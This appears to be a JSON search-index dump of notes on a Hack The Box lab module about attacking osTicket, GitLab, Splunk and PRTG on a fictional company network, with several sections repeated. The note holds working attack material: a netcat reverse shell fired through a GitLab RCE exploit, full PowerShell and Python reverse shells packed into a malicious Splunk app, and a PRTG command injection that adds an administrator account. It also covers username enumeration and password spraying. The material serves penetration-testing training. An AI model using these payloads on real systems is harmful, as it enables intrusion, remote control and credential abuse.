kgrimes password : Fish1ng_s3ason! hashed_password : name : Kevin Grimes vin : address : phone : database_name : MyFitnessPal <SNIP> This dump shows cleartext passwords for two different users: jclayton and kgrimes . At this point, we have also performed subdomain enumeration and come across several interesting ones. hrmns@htb[/htb]$ cat ilfreight_subdomains vpn.inlanefreight.local support.inlanefreight.local ns1.inlanefreight.local mail.inlanefreight.local apps.inlanefreight.local ftp.inlanefreight.local dev.inlanefreight.local ir.inlanefreight.local auth.inlanefreight.local careers.inlanefreight.local portal-stage.inlanefreight.local dns1.inlanefreight.local dns2.inlanefreight.local meet.inlanefreight.local portal-test.inlanefreight.local home.inlanefreight.local legacy.inlanefreight.local We browse to each subdomain and find that many are defunct, but the support.inlanefreight.local and vpn.inlanefreight.local are active and very promising. Support.inlanefreight.local is hosting an osTicket instance, and vpn.inlanefreight.local is a Barracuda SSL VPN web portal that does not appear to be using multi-factor authentication. http://support.inlanefreight.local/scp/login.php We then try the credentials for kgrimes and have no success but noticing that the login page also accepts an email address, we try kevin@inlanefreight.local and get a successful login! http://support.inlanefreight.local/scp/login.php The user kevin appears to be a support agent but does not have any open tickets. Perhaps they are no longer active? In a busy enterprise, we would expect to see some open tickets. Digging around a bit, we find one closed ticket, a conversation between a remote employee and the support agent. http://support.inlanefreight.local/scp/login.php The employee states that they were locked out of their VPN account and asks the agent to reset it. The agent then tells the user that the password was reset to the standard new joiner password. The user does not have this password and asks the agent to call them to provide them with the password. The agent then commits an error and sends the password to the user directly via the portal. From here, we could try this password against the exposed VPN portal as the user may not have changed it. The support agent states that this is the standard password given to new joiners and sets the user's password to this value. We have been in many organizations where the helpdesk uses a standard password for new users and password resets. Often the domain password policy is lax and does not force the user to change at the next login. If this is the case, it may work for other users. In this scenario, it would be worth using tools like linkedin2username to create a user list of company employees and attempt a password spraying attack against the VPN endpoint with this standard password. Many applications such as osTicket also contain an address book. It would also be worth exporting all emails/usernames from the address book as part of our enumeration as they could also prove helpful in an attack such as password spraying. Gitlab \u00b6 GitLab is a web-based Git-repository hosting tool that provides wiki capabilities, issue tracking, and continuous integration and deployment pipeline functionality. It is open-source and originally written in Ruby, but the current technology stack includes Go, Ruby on Rails, and Vue.js. During internal and external penetration tests, it is common to come across interesting data in a company's GitHub repo or a self-hosted GitLab or BitBucket instance. We may find scripts or configuration files that were accidentally committed containing cleartext secrets such as passwords that we may use to our advantage. May also come across SSH private keys. Can attempt to use the search function to search for users, passwords, etc. Worth perusing any public repositories for sensitive data and, if the application allows, register an account and look to see if any interesting internal repositories are accessible. If we can obtain user credentials from our OSINT, we may be able to log in to a GitLab instance. Two-factor authentication is disabled by default. ![https://academy.hackthebox.com/storage/modules/113/gitlab_2fa.png] Footprinting/Discovery \u00b6 We can quickly determine that GitLab is in use in an environment by just browsing to the GitLab URL, and we will be directed to the login page, which displays the GitLab logo. http://gitlab.inlanefreight.local:8081/users/sign_in Version Number -> browse to /help when logged in. If we cannot register an account, we may have to try a low-risk exploit such as this . We do not recommend launching various exploits at an application, so if we have no way to enumerate the version number (such as a date on the page, the first public commit, or by registering a user), then we should stick to hunting for secrets and not try multiple exploits against it blindly. There have been a few serious exploits against GitLab 12.9.0 and GitLab 11.4.7 in the past few years as well as GitLab Community Edition 13.10.3 , 13.9.3 , and 13.10.2 . Enumeration \u00b6 There's not much we can do against GitLab without knowing the version number or being logged in. The first thing we should try is browsing to /explore and see if there are any public projects that may contain something interesting. Browsing to this page, we see a project called Inlanefreight dev . Public projects can be interesting because we may be able to use them to find out more about the company's infrastructure, find production code that we can find a bug in after a code review, hard-coded credentials, a script or configuration file containing credentials, or other secrets such as an SSH private key or API key. http://gitlab.inlanefreight.local:8081/explore Browsing to the project, it looks like an example project and may not contain anything useful, though it is always worth digging around. http://gitlab.inlanefreight.local:8081/root/inlanefreight-dev From here, we can explore each of the pages linked in the top right groups , snippets , and help . Once we are done digging through what is available externally, we should check and see if we can register an account and access additional projects. Suppose the organization did not set up GitLab only to allow company emails to register or require an admin to approve a new account. In that case, we may be able to access additional data. Can also use the registration form to enumerate valid users. If we can make a list of valid users, we could attempt to guess weak passwords or possibly re-use credentials that we find from a password dump using a tool such as Dehashed . If we try to register with an email that has already been taken, we will get the error 1 error prohibited this user from being saved: Email has already been taken . As of the time of writing, this username enumeration technique works with the latest version of GitLab. Even if the Sign-up enabled checkbox is cleared within the settings page under Sign-up restrictions , we can still browse to the /users/sign_up page and enumerate users but will not be able to register a user. Let's register with the credentials hacker:Welcome and log in and poke around. If we go to the /explore page now, we notice that there is now an internal project Inlanefreight website available to us. In a real-world scenario, we may be able to find a considerable amount of sensitive data if we can register and gain access to any of their repositories. As this blog post explains, there is a considerable amount of data that we may be able to uncover on GitLab, GitHub, etc. Attacking GitLab \u00b6 If we were able to gain access as a valid company user or an admin, we could potentially uncover enough data to fully compromise the organization in some way. Username Enumeration \u00b6 Can do this manually, of course, but scripts make our work much faster. We can write one ourselves in Bash or Python or use this one to enumerate a list of valid users. Be mindful of account lockout and other kinds of interruptions. GitLab's defaults are set to 10 failed attempts resulting in an automatic unlock after 10 minutes. # Number of authentication tries before locking an account if lock_strategy # is failed attempts. config.maximum_attempts = 10 # Time interval to unlock the account if :time is enabled as unlock_strategy. config.unlock_in = 10.minutes Running it against the target GitLab instance, we see that there are two valid usernames, root (the built-in admin account) and bob . hrmns@htb[/htb]$ ./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ GitLab User Enumeration Script Version 1.0 Description: It prints out the usernames that exist in your victim's GitLab CE instance Disclaimer: Do not run this script against GitLab.com! Also keep in mind that this PoC is meant only for educational purpose and ethical use. Running it against systems that you do not own or have the right permission is totally on your own risk. Author: @4DoniiS [https://github.com/4D0niiS] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ LOOP 200 [+] The username root exists! LOOP 302 LOOP 302 LOOP 200 [+] The username bob exists! LOOP 302 Authenticated RCE \u00b6 GitLab Community Edition version 13.10.2 and lower suffered from an authenticated remote code execution vulnerability due to an issue with ExifTool handling metadata in uploaded image files. This issue was fixed by GitLab rather quickly, but some companies are still likely using a vulnerable version. We can use this exploit to achieve RCE. We first need a valid username and password. In some instances, this would only work if we could obtain valid credentials through OSINT or a credential guessing attack. If we encounter a vulnerable version of GitLab that allows for self-registration, we can quickly sign up for an account and pull off the attack. hrmns@htb[/htb]$ python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f ' [1] Authenticating Successfully Authenticated [2] Creating Payload [3] Creating Snippet and Uploading [+] RCE Triggered !! And we get a shell almost instantly. hrmns@htb[/htb]$ nc -lnvp 8443 listening on [any] 8443 ... connect to [10.10.14.15] from (UNKNOWN) [10.129.201.88] 60054 git@app04:~/gitlab-workhorse$ id id uid=996(git) gid=997(git) groups=997(git) git@app04:~/gitlab-workhorse$ ls ls VERSION config.toml flag_gitlab.txt sockets","title":"Customer Service Mgmt & Configuration Mgmt"},{"location":"attacking_common_apps/cs_config_mgmt/#osticket","text":"osTicket is an open-source support ticketing system. It can be compared to systems such as Jira, OTRS, Request Tracker, and Spiceworks.","title":"osTicket"},{"location":"attacking_common_apps/cs_config_mgmt/#footprintingdiscoveryenumeration","text":"Looking back at our EyeWitness scan from earlier, we notice a screenshot of an osTicket instance which also shows that a cookie named OSTSESSID was set when visiting the page. osTicket is a web application that is highly maintained and serviced. If we look at the CVEs found over decades, we will not find many vulnerabilities and exploits that osTicket could have. This is an excellent example to show how important it is to understand how a web application works. User Input The core function of osTicket is to inform the company's employees about a problem so that a problem can be solved with the service or other components. A significant advantage we have here is that the application is open-source. Therefore, we have many tutorials and examples available to take a closer look at the application. For instance, from the osTicket documentation , we can see that only staff and users with administrator privileges can access the admin panel. So if our target company uses this or a similar application, we can cause a problem and \"play dumb\" and contact the company's staff. The simulated \"lack of\" knowledge about the services offered by the company in combination with a technical problem is a widespread social engineering approach to get more information from the company. Processing As staff or administrators, they try to reproduce significant errors to find the core of the problem. Processing is finally done internally in an isolated environment that will have very similar settings to the systems in production. Suppose staff and administrators suspect that there is an internal bug that may be affecting the business. In that case, they will go into more detail to uncover possible code errors and address more significant issues. Solution Depending on the depth of the problem, it is very likely that other staff members from the technical departments will be involved in the email correspondence. This will give us new email addresses to use against the osTicket admin panel (in the worst case) and potential usernames with which we can perform OSINT on or try to apply to other company services.","title":"Footprinting/Discovery/Enumeration"},{"location":"attacking_common_apps/cs_config_mgmt/#attacking-osticket","text":"Suppose we find an exposed service such as a company's Slack server or GitLab, which requires a valid company email address to join. Many companies have a support email such as support@inlanefreight.local , and emails sent to this are available in online support portals that may range from Zendesk to an internal custom tool. Furthermore, a support portal may assign a temporary internal email address to a new ticket so users can quickly check its status. If we come across a customer support portal during our assessment and can submit a new ticket, we may be able to obtain a valid company email address. http://support.inlanefreight.local/open.php This is a modified version of osTicket as an example, but we can see that an email address was provided. http://support.inlanefreight.local/open.php If we log in, we can see information about the ticket and ways to post a reply. If the company set up their helpdesk software to correlate ticket numbers with emails, then any email sent to the email we received when registering, 940288@inlanefreight.local , would show up here. With this setup, if we can find an external portal such as a Wiki, chat service (Slack, Mattermost, Rocket.chat), or a Git repository such as GitLab or Bitbucket, we may be able to use this email to register an account and the help desk support portal to receive a sign-up confirmation email. http://support.inlanefreight.local/open.php","title":"Attacking osTicket"},{"location":"attacking_common_apps/cs_config_mgmt/#osticket-sensitive-data-exposure","text":"Let's say we are on an external penetration test. During our OSINT and information gathering, we discover several user credentials using the tool Dehashed . hrmns@htb[/htb]$ sudo python3 dehashed.py -q inlanefreight.local -p id : 5996447501 email : julie.clayton@inlanefreight.local username : jclayton password : JulieC8765! hashed_password : name : Julie Clayton vin : address : phone : database_name : ModBSolutions id : 7344467234 email : kevin@inlanefreight.local username : kgrimes password : Fish1ng_s3ason! hashed_password : name : Kevin Grimes vin : address : phone : database_name : MyFitnessPal <SNIP> This dump shows cleartext passwords for two different users: jclayton and kgrimes . At this point, we have also performed subdomain enumeration and come across several interesting ones. hrmns@htb[/htb]$ cat ilfreight_subdomains vpn.inlanefreight.local support.inlanefreight.local ns1.inlanefreight.local mail.inlanefreight.local apps.inlanefreight.local ftp.inlanefreight.local dev.inlanefreight.local ir.inlanefreight.local auth.inlanefreight.local careers.inlanefreight.local portal-stage.inlanefreight.local dns1.inlanefreight.local dns2.inlanefreight.local meet.inlanefreight.local portal-test.inlanefreight.local home.inlanefreight.local legacy.inlanefreight.local We browse to each subdomain and find that many are defunct, but the support.inlanefreight.local and vpn.inlanefreight.local are active and very promising. Support.inlanefreight.local is hosting an osTicket instance, and vpn.inlanefreight.local is a Barracuda SSL VPN web portal that does not appear to be using multi-factor authentication. http://support.inlanefreight.local/scp/login.php We then try the credentials for kgrimes and have no success but noticing that the login page also accepts an email address, we try kevin@inlanefreight.local and get a successful login! http://support.inlanefreight.local/scp/login.php The user kevin appears to be a support agent but does not have any open tickets. Perhaps they are no longer active? In a busy enterprise, we would expect to see some open tickets. Digging around a bit, we find one closed ticket, a conversation between a remote employee and the support agent. http://support.inlanefreight.local/scp/login.php The employee states that they were locked out of their VPN account and asks the agent to reset it. The agent then tells the user that the password was reset to the standard new joiner password. The user does not have this password and asks the agent to call them to provide them with the password. The agent then commits an error and sends the password to the user directly via the portal. From here, we could try this password against the exposed VPN portal as the user may not have changed it. The support agent states that this is the standard password given to new joiners and sets the user's password to this value. We have been in many organizations where the helpdesk uses a standard password for new users and password resets. Often the domain password policy is lax and does not force the user to change at the next login. If this is the case, it may work for other users. In this scenario, it would be worth using tools like linkedin2username to create a user list of company employees and attempt a password spraying attack against the VPN endpoint with this standard password. Many applications such as osTicket also contain an address book. It would also be worth exporting all emails/usernames from the address book as part of our enumeration as they could also prove helpful in an attack such as password spraying.","title":"osTicket - Sensitive Data Exposure"},{"location":"attacking_common_apps/cs_config_mgmt/#gitlab","text":"GitLab is a web-based Git-repository hosting tool that provides wiki capabilities, issue tracking, and continuous integration and deployment pipeline functionality. It is open-source and originally written in Ruby, but the current technology stack includes Go, Ruby on Rails, and Vue.js. During internal and external penetration tests, it is common to come across interesting data in a company's GitHub repo or a self-hosted GitLab or BitBucket instance. We may find scripts or configuration files that were accidentally committed containing cleartext secrets such as passwords that we may use to our advantage. May also come across SSH private keys. Can attempt to use the search function to search for users, passwords, etc. Worth perusing any public repositories for sensitive data and, if the application allows, register an account and look to see if any interesting internal repositories are accessible. If we can obtain user credentials from our OSINT, we may be able to log in to a GitLab instance. Two-factor authentication is disabled by default. ![https://academy.hackthebox.com/storage/modules/113/gitlab_2fa.png]","title":"Gitlab"},{"location":"attacking_common_apps/cs_config_mgmt/#footprintingdiscovery","text":"We can quickly determine that GitLab is in use in an environment by just browsing to the GitLab URL, and we will be directed to the login page, which displays the GitLab logo. http://gitlab.inlanefreight.local:8081/users/sign_in Version Number -> browse to /help when logged in. If we cannot register an account, we may have to try a low-risk exploit such as this . We do not recommend launching various exploits at an application, so if we have no way to enumerate the version number (such as a date on the page, the first public commit, or by registering a user), then we should stick to hunting for secrets and not try multiple exploits against it blindly. There have been a few serious exploits against GitLab 12.9.0 and GitLab 11.4.7 in the past few years as well as GitLab Community Edition 13.10.3 , 13.9.3 , and 13.10.2 .","title":"Footprinting/Discovery"},{"location":"attacking_common_apps/cs_config_mgmt/#enumeration","text":"There's not much we can do against GitLab without knowing the version number or being logged in. The first thing we should try is browsing to /explore and see if there are any public projects that may contain something interesting. Browsing to this page, we see a project called Inlanefreight dev . Public projects can be interesting because we may be able to use them to find out more about the company's infrastructure, find production code that we can find a bug in after a code review, hard-coded credentials, a script or configuration file containing credentials, or other secrets such as an SSH private key or API key. http://gitlab.inlanefreight.local:8081/explore Browsing to the project, it looks like an example project and may not contain anything useful, though it is always worth digging around. http://gitlab.inlanefreight.local:8081/root/inlanefreight-dev From here, we can explore each of the pages linked in the top right groups , snippets , and help . Once we are done digging through what is available externally, we should check and see if we can register an account and access additional projects. Suppose the organization did not set up GitLab only to allow company emails to register or require an admin to approve a new account. In that case, we may be able to access additional data. Can also use the registration form to enumerate valid users. If we can make a list of valid users, we could attempt to guess weak passwords or possibly re-use credentials that we find from a password dump using a tool such as Dehashed . If we try to register with an email that has already been taken, we will get the error 1 error prohibited this user from being saved: Email has already been taken . As of the time of writing, this username enumeration technique works with the latest version of GitLab. Even if the Sign-up enabled checkbox is cleared within the settings page under Sign-up restrictions , we can still browse to the /users/sign_up page and enumerate users but will not be able to register a user. Let's register with the credentials hacker:Welcome and log in and poke around. If we go to the /explore page now, we notice that there is now an internal project Inlanefreight website available to us. In a real-world scenario, we may be able to find a considerable amount of sensitive data if we can register and gain access to any of their repositories. As this blog post explains, there is a considerable amount of data that we may be able to uncover on GitLab, GitHub, etc.","title":"Enumeration"},{"location":"attacking_common_apps/cs_config_mgmt/#attacking-gitlab","text":"If we were able to gain access as a valid company user or an admin, we could potentially uncover enough data to fully compromise the organization in some way.","title":"Attacking GitLab"},{"location":"attacking_common_apps/cs_config_mgmt/#username-enumeration","text":"Can do this manually, of course, but scripts make our work much faster. We can write one ourselves in Bash or Python or use this one to enumerate a list of valid users. Be mindful of account lockout and other kinds of interruptions. GitLab's defaults are set to 10 failed attempts resulting in an automatic unlock after 10 minutes. # Number of authentication tries before locking an account if lock_strategy # is failed attempts. config.maximum_attempts = 10 # Time interval to unlock the account if :time is enabled as unlock_strategy. config.unlock_in = 10.minutes Running it against the target GitLab instance, we see that there are two valid usernames, root (the built-in admin account) and bob . hrmns@htb[/htb]$ ./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ GitLab User Enumeration Script Version 1.0 Description: It prints out the usernames that exist in your victim's GitLab CE instance Disclaimer: Do not run this script against GitLab.com! Also keep in mind that this PoC is meant only for educational purpose and ethical use. Running it against systems that you do not own or have the right permission is totally on your own risk. Author: @4DoniiS [https://github.com/4D0niiS] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ LOOP 200 [+] The username root exists! LOOP 302 LOOP 302 LOOP 200 [+] The username bob exists! LOOP 302","title":"Username Enumeration"},{"location":"attacking_common_apps/cs_config_mgmt/#authenticated-rce","text":"GitLab Community Edition version 13.10.2 and lower suffered from an authenticated remote code execution vulnerability due to an issue with ExifTool handling metadata in uploaded image files. This issue was fixed by GitLab rather quickly, but some companies are still likely using a vulnerable version. We can use this exploit to achieve RCE. We first need a valid username and password. In some instances, this would only work if we could obtain valid credentials through OSINT or a credential guessing attack. If we encounter a vulnerable version of GitLab that allows for self-registration, we can quickly sign up for an account and pull off the attack. hrmns@htb[/htb]$ python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f ' [1] Authenticating Successfully Authenticated [2] Creating Payload [3] Creating Snippet and Uploading [+] RCE Triggered !! And we get a shell almost instantly. hrmns@htb[/htb]$ nc -lnvp 8443 listening on [any] 8443 ... connect to [10.10.14.15] from (UNKNOWN) [10.129.201.88] 60054 git@app04:~/gitlab-workhorse$ id id uid=996(git) gid=997(git) groups=997(git) git@app04:~/gitlab-workhorse$ ls ls VERSION config.toml flag_gitlab.txt sockets","title":"Authenticated RCE"},{"location":"attacking_common_apps/infra_network_monitoring_tools/","text":"Splunk \u00b6 Splunk is a log analytics tool used to gather, analyze and visualize data. Though not originally intended to be a SIEM tool, Splunk is often used for security monitoring and business analytics. Splunk deployments are often used to house sensitive data and could provide a wealth of information for an attacker if compromised. The biggest focus of Splunk during an assessment would be weak or null authentication because admin access to Splunk gives us the ability to deploy custom applications that can be used to quickly compromise a Splunk server and possibly other hosts in the network depending on the way Splunk is set up. Discovery/Footprinting \u00b6 Splunk is prevalent in internal networks and often runs as root on Linux or SYSTEM on Windows systems. While uncommon, we may encounter Splunk externally facing at times. The Splunk web server runs by default on port 8000. On older versions of Splunk, the default credentials are admin:changeme , which are conveniently displayed on the login page. Latest version of Splunk sets credentials during the installation process. If the default credentials do not work, it is worth checking for common weak passwords such as admin, Welcome, Welcome1, Password123, etc. We can see that Nmap identified the Splunkd httpd service on port 8000 and port 8089, the Splunk management port for communication with the Splunk REST API. hrmns@htb[/htb]$ sudo nmap -sV 10 .129.201.50 Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-22 08:43 EDT Nmap scan report for 10.129.201.50 Host is up (0.11s latency). Not shown: 991 closed ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 3389/tcp open ms-wbt-server Microsoft Terminal Services 5357/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 8000/tcp open ssl/http Splunkd httpd 8080/tcp open http Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor) 8089/tcp open ssl/http Splunkd httpd Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 39.22 seconds Enumeration \u00b6 Splunk Enterprise trial converts to a free version after 60 days, which doesn\u2019t require authentication. Once logged in, we can browse data, run reports, create dashboards, install applications from the Splunkbase library, and install custom applications. Common method of gaining remote code execution on a Splunk server is through the use of a scripted input. These are designed to help integrate Splunk with data sources such as APIs or file servers that require custom methods to access. Scripted inputs are intended to run these scripts, with STDOUT provided as input to Splunk. As Splunk can be installed on Windows or Linux hosts, scripted inputs can be created to run Bash, PowerShell, or Batch scripts. Also, every Splunk installation comes with Python installed, so Python scripts can be run on any Splunk system. A quick way to gain RCE is by creating a scripted input that tells Splunk to run a Python reverse shell script. Attacking Splunk \u00b6 We can gain remote code execution on Splunk by creating a custom application to run Python, Batch, Bash, or PowerShell scripts. Abusing Built-In Functionality \u00b6 Can use this Splunk package to assist us. The bin directory in this repo has examples for Python and PowerShell First need to create a custom Splunk application using the following directory structure. hrmns@htb[/htb]$ tree splunk_shell/ splunk_shell/ \u251c\u2500\u2500 bin \u2514\u2500\u2500 default 2 directories, 0 files The bin directory will contain any scripts that we intend to run (in this case, a PowerShell reverse shell), and the default directory will have our inputs.conf file. Our reverse shell will be a PowerShell one-liner. #A simple and small reverse shell. Options and help removed to save space. #Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well. $client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close( The inputs.conf file tells Splunk which script to run and any other conditions. Here we set the app as enabled and tell Splunk to run the script every 10 seconds. The interval is always in seconds, and the input (script) will only run if this setting is present. Need the .bat file, which will run when the application is deployed and execute the PowerShell one-liner. @ECHO OFF PowerShell.exe -exec bypass -w hidden -Command \"& '%~dpn0.ps1'\" Exit Once the files are created, we can create a tarball or .spl file. hrmns@htb[/htb]$ tar -cvzf updater.tar.gz splunk_shell/ splunk_shell/ splunk_shell/bin/ splunk_shell/bin/rev.py splunk_shell/bin/run.bat splunk_shell/bin/run.ps1 splunk_shell/default/ splunk_shell/default/inputs.conf Next choose Install app from file and upload the application https://10.129.201.50:8000/en-US/manager/search/apps/local Before uploading the malicious custom app, start a listener using Netcat or socat . hrmns@htb[/htb]$ sudo nc -lnvp 443 listening on [any] 443 ... On the Upload app page, click browse, choose the tarball created earlier and click Upload . As soon as we upload the application, a reverse shell is received as the status of the application will automatically be switched to Enabled . hrmns@htb[/htb]$ sudo nc -lnvp 443 listening on [any] 443 ... connect to [10.10.14.15] from (UNKNOWN) [10.129.201.50] 53145 PS C:\\Windows\\system32> whoami nt authority\\system PS C:\\Windows\\system32> hostname APP03 PS C:\\Windows\\system32> In this case, we got a shell back as NT AUTHORTY\\SYSTEM . If this were a real-world assessment, we could proceed to enumerate the target for credentials in the registry, memory, or stored elsewhere on the file system to use for lateral movement within the network. If this was our initial foothold in the domain environment, we could use this access to begin enumerating the Active Directory domain. If we were dealing with a Linux host, we would need to edit the rev.py Python script before creating the tarball and uploading the custom malicious app. The rest of the process would be the same, and we would get a reverse shell connection on our Netcat listener. import sys , socket , os , pty ip = \"10.10.14.15\" port = \"443\" s = socket . socket () s . connect (( ip , int ( port ))) [ os . dup2 ( s . fileno (), fd ) for fd in ( 0 , 1 , 2 )] pty . spawn ( '/bin/bash' ) If the compromised Splunk host is a deployment server, it will likely be possible to achieve RCE on any hosts with Universal Forwarders installed on them. To push a reverse shell out to other hosts, the application must be placed in the $SPLUNK_HOME/etc/deployment-apps directory on the compromised host. In a Windows-heavy environment, we will need to create an application using a PowerShell reverse shell since the Universal forwarders do not install with Python like the Splunk server. PRTG Network Monitor \u00b6 PRTG Network Monitor is agentless network monitor software. It can be used to monitor bandwidth usage, uptime and collect statistics from various hosts, including routers, switches, servers, and more. Discovery/Footprinting/Enumeration \u00b6 Can quickly discover PRTG from an Nmap scan. can typically be found on common web ports such as 80, 443, or 8080. It is possible to change the web interface port in the Setup section when logged in as an admin. hrmns@htb[/htb]$ sudo nmap -sV -p- --open -T4 10 .129.201.50 Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-22 15:41 EDT Stats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 0.06% done Nmap scan report for 10.129.201.50 Host is up (0.11s latency). Not shown: 65492 closed ports, 24 filtered ports Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 3389/tcp open ms-wbt-server Microsoft Terminal Services 5357/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 8000/tcp open ssl/http Splunkd httpd 8080/tcp open http Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor) 8089/tcp open ssl/http Splunkd httpd 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC 49676/tcp open msrpc Microsoft Windows RPC 49677/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 97.17 seconds Service Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor) detected on port 8080. PRTG also shows up in the EyeWitness scan performed earlier. Here we can see that EyeWitness lists the default credentials prtgadmin:prtgadmin . Once we discovered PRTG, we can confirm it by browing to the URL. http://10.129.201.50:8080/index.htm From the enumeration performed so far, it seems to be PRTG version 17.3.33.2830 and is likely vulnerable to CVE-2018-9276 which is an authenticated command injection in the PRTG System Administrator web console for PRTG Network Monitor before version 18.2.39. Based on the version reported by Nmap, we can assume that we are dealing with a vulnerable version. Using cURL we can see that the version number is indeed 17.3.33.283 . hrmns@htb[/htb]$ curl -s http://10.129.201.50:8080/index.htm -A \"Mozilla/5.0 (compatible; MSIE 7.01; Windows NT 5.0)\" | grep version <link rel=\"stylesheet\" type=\"text/css\" href=\"/css/prtgmini.css?prtgversion=17.3.33.2830__\" media=\"print,screen,projection\" /> <div><h3><a target=\"_blank\" href=\"https://blog.paessler.com/new-prtg-release-21.3.70-with-new-azure-hpe-and-redfish-sensors\">New PRTG release 21.3.70 with new Azure, HPE, and Redfish sensors</a></h3><p>Just a short while ago, I introduced you to PRTG Release 21.3.69, with a load of new sensors, and now the next version is ready for installation. And this version also comes with brand new stuff!</p></div> <span class=\"prtgversion\">&nbsp;PRTG Network Monitor 17.3.33.2830 </span> http://10.129.201.50:8080/welcome.htm Leveraging Known Vulnerabilities \u00b6 This excellent blog post by the individual who discovered this flaw does a great job of walking through the initial discovery process and how they discovered it. When creating a new notification, the Parameter field is passed directly into a PowerShell script without any type of input sanitization. Mouse over Setup in the top right and then the Account Settings menu and finally click on Notifications . Click on Add new notification . Give it a name and scroll down and tick the box next to EXECUTE PROGRAM . Under Program File , select Demo exe notification - outfile.ps1 from the drop-down. Finally, in the parameter field, enter a command. For our purposes, we will add a new local admin user by entering test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add . During an actual assessment, we may want to do something that does not change the system, such as getting a reverse shell or connection to our favorite C2. Finally, click the Save button. After clicking Save , we will be redirected to the Notifications page and see our new notification named pwn in the list. Now, we could have scheduled the notification to run (and execute our command) at a later time when setting it up. This could prove handy as a persistence mechanism during a long-term engagement and is worth taking note of. Schedules can be modified in the account settings menu if we want to set it up to run at a specific time every day to get our connection back or something of that nature. At this point, all that is left is to click the Test button to run our notification and execute the command to add a local admin user. After clicking Test we will get a pop-up that says EXE notification is queued up . If we receive any sort of error message here, we can go back and double-check the notification settings. Since this is a blind command execution, we won't get any feedback, so we'd have to either check our listener for a connection back or, in our case, check to see if we can authenticate to the host as a local admin. We can use CrackMapExec to confirm local admin access. We could also try to RDP to the box, access over WinRM, or use a tool such as evil-winrm or something from the impacket toolkit such as wmiexec.py or psexec.py . hrmns@htb[/htb]$ sudo crackmapexec smb 10 .129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG! SMB 10.129.201.50 445 APP03 [*] Windows 10.0 Build 17763 (name:APP03) (domain:APP03) (signing:False) (SMBv1:False) SMB 10.129.201.50 445 APP03 [+] APP03\\prtgadm1:Pwn3d_by_PRTG! (Pwn3d!)","title":"Infrastructure/Network Monitoring Tools"},{"location":"attacking_common_apps/infra_network_monitoring_tools/#splunk","text":"Splunk is a log analytics tool used to gather, analyze and visualize data. Though not originally intended to be a SIEM tool, Splunk is often used for security monitoring and business analytics. Splunk deployments are often used to house sensitive data and could provide a wealth of information for an attacker if compromised. The biggest focus of Splunk during an assessment would be weak or null authentication because admin access to Splunk gives us the ability to deploy custom applications that can be used to quickly compromise a Splunk server and possibly other hosts in the network depending on the way Splunk is set up.","title":"Splunk"},{"location":"attacking_common_apps/infra_network_monitoring_tools/#discoveryfootprinting","text":"Splunk is prevalent in internal networks and often runs as root on Linux or SYSTEM on Windows systems. While uncommon, we may encounter Splunk externally facing at times. The Splunk web server runs by 